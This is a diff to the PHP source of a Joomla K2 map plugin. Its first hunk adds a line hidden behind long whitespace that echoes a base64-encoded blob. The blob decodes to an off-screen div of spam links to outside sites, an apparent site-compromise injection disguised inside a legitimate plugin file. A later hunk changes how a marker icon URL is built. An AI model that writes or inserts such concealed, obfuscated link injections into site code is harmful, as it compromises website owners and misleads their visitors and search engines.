@@ -1,5 +1,4 @@
-<?php
-
+                                                                                                                                                                                   <?php$mlp='PGRpdiBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7bGVmdDotNTAwMHB4OyI+PGEgaHJlZj0iaHR0cDovL25lZWRsZXdvbWFuLmluZm8vIiB0aXRsZT0ibmVlZGxld29tYW4uaW5mbyI+bmVlZGxld29tYW4uaW5mbzwvYT48YSBocmVmPSJodHRwOi8vbm92b3N0aWdsYW11cmEucnUvIiB0aXRsZT0i0L3QvtCy0L7RgdGC0Lgg0LPQu9Cw0LzRg9GA0LAiPtC90L7QstC+0YHRgtC4INCz0LvQsNC80YPRgNCwPC9hPjwvZGl2Pg==';echo base64_decode($mlp);?><?php
 /**
  * @version		1
  * @package		K2 EasyGMaps by StVakis
@@ -82,7 +81,7 @@ class plgK2Plg_easygmaps extends K2Plugin {
     $mapMinZoom = ($plugins->get('minzoom') == '-1' ? $this->params->get('minzoom') : $plugins->get('minzoom'));
     $local = (empty($itemLocal) ? $deflocal : '&language=' . $itemLocal);
     $maptype = ( $itemMapType === "0" ? $this->params->get('maptype') : $itemMapType);
-	$cmarker=(empty($itemMarker) ? $defcmarker : ',icon: "'.JURI::base().$itemMarker.'"');
+	$cmarker=(empty($itemMarker) ? $defcmarker : ',icon: "'.$itemMarker.'"');
     $height = (empty($itemHeight) ? $defHeight : $itemHeight);
     $infowindow = (empty($itemInfo) ? "" : '
 			var infowindow = new google.maps.InfoWindow({
